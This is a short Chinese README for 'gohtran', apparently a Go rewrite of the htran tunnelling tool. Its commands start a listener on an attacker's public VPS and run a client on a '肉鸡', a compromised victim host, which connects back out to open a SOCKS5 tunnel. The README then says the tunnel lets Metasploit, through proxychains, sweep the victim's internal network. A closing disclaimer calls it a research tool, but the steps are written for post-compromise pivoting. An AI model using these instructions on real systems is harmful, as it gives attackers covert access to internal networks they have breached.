# gohtran
使用golang 重复造了一个htran的轮子

因为go语言编译后的程序太大,只好把内网与公网程序分开.

使用方式,首先在公网VPS上启动listener

listener  3389  33333     #第一个端口是客户端上线监听端口  第二个socks5服务监听端口

然后在肉鸡上执行

client ip:3389            #vps的ip和vps上监听的端口            


proxychain 配置上公网VPS的33333端口，就可以msf梭哈肉鸡内网了



# 注意

本工具只作为安全研究工具，请勿在真实肉鸡上使用，或者其他违法用途。
否则后果自负
